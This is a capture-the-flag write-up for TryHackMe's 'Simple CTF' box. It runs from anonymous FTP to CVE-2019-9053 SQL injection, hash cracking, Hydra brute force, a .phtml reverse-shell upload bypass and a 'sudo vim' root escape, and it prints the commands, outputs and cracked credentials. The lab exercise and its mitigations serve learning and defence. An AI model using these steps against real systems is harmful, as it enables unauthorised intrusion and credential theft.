```
 ███████╗██╗███╗   ███╗██████╗ ██╗     ███████╗
 ██╔════╝██║████╗ ████║██╔══██╗██║     ██╔════╝
 ███████╗██║██╔████╔██║██████╔╝██║     █████╗
 ╚════██║██║██║╚██╔╝██║██╔═══╝ ██║     ██╔══╝
 ███████║██║██║ ╚═╝ ██║██║     ███████╗███████╗
 ╚══════╝╚═╝╚═╝     ╚═╝╚═╝     ╚══════╝╚══════╝
  ██████╗████████╗███████╗
 ██╔════╝╚══██╔══╝██╔════╝
 ██║        ██║   █████╗
 ██║        ██║   ██╔══╝
 ╚██████╗   ██║   ██║
  ╚═════╝   ╚═╝   ╚═╝
       TryHackMe: Simple CTF
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-06 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Easy | ⭐ **Rating:** ⭐⭐⭐☆☆

> ⏱️ ~14 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)
- [SEO & Publishing](#-seo--publishing)

---

## Progress Checklist

- [x] Port scan: discovered FTP (21), HTTP (80), SSH on non-standard port (2222)
- [x] Anonymous FTP login: retrieved `ForMitch.txt`, learned username `mitch`
- [x] Web directory brute force: found `/simple/` CMS installation
- [x] Identified CMS Made Simple 2.2.8
- [x] Exploited CVE-2019-9053 (SQL injection) to extract credentials
- [x] Cracked salted MD5 hash with Hashcat
- [x] Brute-forced CMS admin login with Hydra (confirmed password reuse)
- [x] Uploaded `.phtml` reverse shell to bypass extension filter
- [x] Caught reverse shell as `www-data`
- [x] SSH into box as `mitch` using cracked credentials
- [x] Identified `sudo vim` with no password
- [x] Escaped to root shell via `sudo vim -c ':!/bin/sh'`
- [x] Retrieved user and root flags

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap: port scanning and service detection
- 📂 FTP client: anonymous login and file retrieval
- 🕷️ Feroxbuster: web directory enumeration
- 🐉 Hydra: HTTP POST brute force against CMS login
- 🐍 Python 2 exploit (EDB-46635): CMS Made Simple SQLi credential extraction
- 🔓 Hashcat: salted MD5 hash cracking
- 🐚 Netcat: reverse shell listener
- 🔑 SSH: authenticated shell access

---

## ⚡ TL;DR

Anonymous FTP exposed a note revealing username `mitch`. A CMS Made Simple 2.2.8 installation on the web server was vulnerable to CVE-2019-9053 (unauthenticated SQL injection), leaking a salted MD5 hash that cracked to `secret`. Password reuse got us into the CMS admin panel; a file upload extension filter bypass (`.phtml` instead of `.php`) gave a `www-data` shell. SSH with the cracked credentials landed a proper user shell. `sudo vim` with no password requirement escalated directly to root in one command.

---

## 📖 Introduction

Today's target is **Simple CTF**: a box that tells you exactly how complicated things are going to get right there in the name. Three services, one username left in a plaintext note on an anonymous FTP server, a CMS running a publicly known SQL injection vulnerability, and a `sudo` rule so generous it might as well be a signed permission slip to root. The only thing standing between `www-data` and a proper shell was a file upload filter that had apparently never heard of `.phtml`. Simple indeed.

### Prerequisites

Readers are assumed to know:

- FTP client basics and what anonymous login means
- What a CMS (Content Management System) is
- Basic understanding of SQL injection and hash cracking concepts
- How reverse shells work and how to catch them with Netcat
- What `sudo -l` reveals and why unrestricted `sudo` on an editor is dangerous

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

Three ports this time: more interesting than the usual two.

*Full-range sweep, Nmap handling service and version detection:*

```bash
rustscan -a 10.49.168.253 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 21/tcp | FTP | vsftpd 3.0.3: **anonymous login allowed** |
| 80/tcp | HTTP | Apache httpd 2.4.18 (Ubuntu) |
| 2222/tcp | SSH | OpenSSH 7.2p2 Ubuntu |

Two things stand out immediately. First, Nmap flags anonymous FTP login as allowed: that's a free credential bypass that demands immediate attention. Second, SSH is running on port 2222 rather than the standard 22, which is a common "security by obscurity" measure that obscures nothing from a full port scan.

Nmap also picks up something valuable from `robots.txt` on port 80:

```
http-robots.txt: 2 disallowed entries
/  /openemr-5_0_1_3
```

The `robots.txt` is trying to hide a specific path: a medical records software installation. *This turned out to be a distraction; the actual target CMS was at `/simple/` discovered during directory enumeration.*

### Anonymous FTP

The anonymous FTP flag from Nmap is too good to ignore. FTP passive mode timed out immediately, requiring a manual switch before directory listing would respond.

*Connecting to FTP, switching to active mode to resolve passive mode timeout:*

```bash
ftp 10.49.168.253
```

```
Name: anonymous
230 Login successful.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
ftp> cd pub
ftp> ls
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt    # ^^^ jackpot
```

*Downloading the note:*

```bash
ftp> get ForMitch.txt
```

```
# ForMitch.txt contents
Dammit man... you're the worst dev I've seen. You set the same pass for
the system user, and the password is so weak... I cracked it in seconds.
Gosh... what a mess!
```

Username: `mitch`. Password: unknown but weak enough to crack in seconds: rockyou.txt territory. Also critically: the note says the *system* user password is the same as whatever other account this refers to: meaning one cracked password likely opens multiple doors.

### Web Directory Enumeration

*(~8 mins into the box)*

*Feroxbuster with PHP, TXT, and HTML extensions:*

```bash
feroxbuster -u http://10.49.168.253/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,html
```

```
# output (relevant hits only)
200  http://10.49.168.253/robots.txt
301  http://10.49.168.253/simple              # ^^^ CMS installation
200  http://10.49.168.253/simple/index.php
302  http://10.49.168.253/simple/admin/index.php  =>  login.php
200  http://10.49.168.253/simple/admin/login.php
```

The `/simple/` directory hosts a full CMS Made Simple installation. The footer of the site reveals the version: **CMS Made Simple 2.2.8**.

---

## 🚪 Foothold

*(~15 mins into the box)*

### CVE-2019-9053: CMS Made Simple SQL Injection

**What is this vulnerability?** CMS Made Simple versions prior to 2.2.10 contain an unauthenticated time-based blind SQL injection in the News module via the `m1_idlist` parameter. An attacker can exploit this to enumerate the database without any credentials, extracting usernames, email addresses, password hashes, and salts directly from the CMS database.

The exploit is available on Exploit-DB as EDB-46635. It's a Python 2 script, which required a small amount of dependency wrestling before it would run cleanly: `termcolor` needed to be grabbed manually since the pip2 ecosystem has largely collapsed.

*Setting up the Python 2 dependency:*

```bash
curl -s https://raw.githubusercontent.com/termcolor/termcolor/1.1.0/termcolor.py \
  -o termcolor.py
```

*Running the SQL injection exploit against the target:*

```bash
python2 46635.py -u http://10.49.168.253/simple
```

```
# output
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

The hash format is `md5($salt.$pass)`: a salted MD5, Hashcat mode 20.

### Hash Cracking: Hashcat

*Preparing the hash in the format Hashcat expects (`hash:salt`):*

```bash
echo "0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2" > target_hash.txt
```

*Cracking with rockyou.txt, mode 20 (md5($salt.$pass)):*

```bash
hashcat -m 20 -a 0 target_hash.txt /usr/share/wordlists/rockyou.txt
```

```
# output
0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret

Status: Cracked
Hash.Mode: 20 (md5($salt.$pass))
Time.Started: Sat Jun  6 18:31:51 2026 (0 secs)   # ^^^ instant
```

Password: `secret`. The note from the FTP server was not exaggerating.

### Credentials Summary

| Username | Password | Where Found |
| --- | --- | --- |
| `mitch` | `secret` | SQLi extraction → Hashcat crack |

---

## 🐚 Shell / Access

*(~25 mins into the box)*

### CMS Admin Login: Confirming Password Reuse

With credentials in hand, logging into the CMS admin panel at `/simple/admin/login.php` confirmed `mitch:secret` works. The CMS is running as a relatively low-privilege web user, so the admin panel itself isn't the end goal: it's a means to upload a reverse shell.

*Hydra was also used to independently confirm the credentials via brute force:*

```bash
hydra -l mitch -P /usr/share/wordlists/rockyou.txt 10.49.168.253 \
  http-post-form \
  "/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect"
```

```
# output
[80][http-post-form] host: 10.49.168.253   login: mitch   password: secret
1 of 1 target successfully completed
```

### File Upload: Extension Filter Bypass

The CMS admin panel includes a file manager with upload functionality. Uploading a standard `.php` reverse shell (PentestMonkey's `php-reverse-shell.php`) was blocked: the application maintains an allowlist of safe extensions and rejects anything not on it.

**What is a file extension filter bypass?** Web applications often try to prevent malicious file uploads by checking the file extension. Allowlist approaches are more robust (permit only `.jpg`, `.png`, etc.) but this CMS's filter failed to account for alternative PHP execution extensions that Apache will still process as PHP code. `.phtml` is one such extension: it's treated as PHP by the server but not blocked by the filter.

*Renaming the reverse shell to evade the filter:*

```bash
cp php-reverse-shell.php php-reverse-shell.phtml
```

The `.php.jpg` double-extension trick was attempted first and failed: the server correctly identified it as non-image. `.phtml` uploaded cleanly and executed.

*Setting up the listener before triggering the shell:*

```bash
nc -nlvp 4444
```

*Navigating to the uploaded file via the CMS uploads directory to trigger execution.*

```
# reverse shell callback
connect to [192.168.133.233] from (UNKNOWN) [10.49.168.253] 50196
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

*Stabilising the shell:*

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

We're in as `www-data`. The home directories for `mitch` and `sunbath` are both permission-denied from this account, but we already have the SSH password.

### SSH: Proper User Shell

The note said the system user password matches. Port 2222, credentials `mitch:secret`:

```bash
ssh mitch@10.49.168.253 -p 2222
```

```
# output
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
$ whoami
mitch
$ cat user.txt
G00d j0b, keep up!
```

---

## 📈 Escalation

*(~35 mins into the box)*

### sudo vim: GTFOBins Classic

The first thing to check after landing a user shell: what can this user run as root?

*Checking sudo permissions:*

```bash
sudo -l
```

```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

**Why is this dangerous?** `vim` is a text editor, but it's also a fully-featured scripting environment that can execute arbitrary shell commands. GTFOBins documents dozens of editors, interpreters, and utilities that can be abused to escape to a shell when granted `sudo` access. The `:!` command in `vim` runs a shell command directly. When `vim` is running as root (via `sudo`), that shell command runs as root too.

*One command to root:*

```bash
sudo vim -c ':!/bin/sh'
```

```
# output: root shell
# whoami
root
# cat /root/root.txt
W3ll d0n3. You made it!
```

---

## 💥 Exploitation

The full attack chain, end to end:

1. **Anonymous FTP** exposed `ForMitch.txt` → learned username `mitch` and that his password is reused and weak
2. **CVE-2019-9053** (CMS Made Simple SQLi) → extracted salted MD5 hash from the database
3. **Hashcat** cracked `md5($salt.$pass)` → plaintext password `secret`
4. **`.phtml` upload bypass** → reverse shell as `www-data`
5. **SSH with cracked credentials** → proper user shell as `mitch`
6. **`sudo vim` GTFOBins escape** → root shell in one command

---

## 🐇 Rabbit Holes

### openemr-5_0_1_3 in robots.txt

Nmap flagged a disallowed entry in `robots.txt` pointing to an OpenEMR installation path. OpenEMR is medical records software with its own public CVEs. *This appeared to be a decoy path: the directory did not return a valid response and no actual OpenEMR installation was present.* Following it up cost a few minutes of investigation.

### `.php.jpg` Double Extension

The first upload bypass attempt used a double extension (`php-reverse-shell.php.jpg`), which is a common trick against naive filters that only check the last extension. The server's upload handler checked the full filename and identified it as non-image. Dropping back to `.phtml` as a single extension resolved it immediately.

### Python 2 / pip2 Dependency Hell

The EDB-46635 exploit is Python 2 only and imports `termcolor`. Attempting to install `termcolor` via `pip2` failed due to Python 2's end-of-life package ecosystem breaking `setuptools`. The fix was fetching the `termcolor.py` module source file directly from GitHub and dropping it in the same directory as the exploit: no package manager involved.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `G00d j0b, keep up!` | `/home/mitch/user.txt` |
| Root | `W3ll d0n3. You made it!` | `/root/root.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Anonymous FTP with sensitive data | High | Disable anonymous FTP; never store credential hints or usernames on publicly accessible services |
| CMS Made Simple 2.2.8 (CVE-2019-9053) | Critical | Update to CMS Made Simple 2.2.10+; keep CMS software patched |
| Weak password (`secret`) | Critical | Enforce a minimum password complexity policy; use a password manager |
| Password reuse across CMS and system account | High | Use unique passwords for every service and account |
| File upload filter: extension allowlist incomplete | High | Explicitly allowlist only safe, non-executable extensions; deny everything else; additionally validate file content (magic bytes), not just the name |
| `sudo vim` with `NOPASSWD` | Critical | Never grant `sudo` access to editors, interpreters, or scripting tools; if vim access is needed, restrict it to specific files with `sudoedit` |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** Granting `sudo` access to any program that can run arbitrary commands: editors, interpreters, pagers, file transfer tools: is functionally equivalent to granting unrestricted root access. Always check GTFOBins before adding anything to a `sudoers` file.

---

## 🔁 If I Did It Again

Skip the CVE-2019-9053 exploit entirely and go straight from Hydra (which cracked the password in under ten seconds) to the CMS file upload: the SQL injection path was interesting but the Hydra result was faster and got to the same place. The exploit is worth knowing, but not worth the Python 2 dependency yak-shaving in a timed scenario.

---

## 🔚 Changelog

*Last updated: 2026-06-06*

---
